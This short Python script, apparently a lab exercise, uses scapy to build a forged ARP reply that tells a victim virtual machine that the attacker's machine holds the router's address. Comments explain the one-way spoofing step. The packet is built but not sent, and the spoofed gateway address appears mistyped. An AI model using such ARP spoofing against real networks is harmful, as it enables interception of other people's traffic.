#!/usr/bin/env python


import scapy.all as scapy

"""In Terminal use > python > import scapy.all as scapy > scapy.ls(scapy.ARP) for help on arguments"""
""" op is set to 1 by default - an ARP packet will create an ARP request BUT we need to create an ARP RESPONSE so op=2"""


"""One Way Spoofing -  We are sending a packet to the victim that says "I have the router's mac address"""
# Create an ARP packet that sends the target location and store in a variable called packet
packet = scapy.ARP(op=2, pdst="192.168.198.130", hwdst="00:0c:29:67:f4:69", psrc="198.168.198.2")
# we send op = 2 soo that it will be sent as an arp Response. not Request
# we are sending the destination IP (Windows VM)
# we send the hardware Mac Address of the
# the prsc is set to receive and and associate the gateway's IP to our Kali Machine

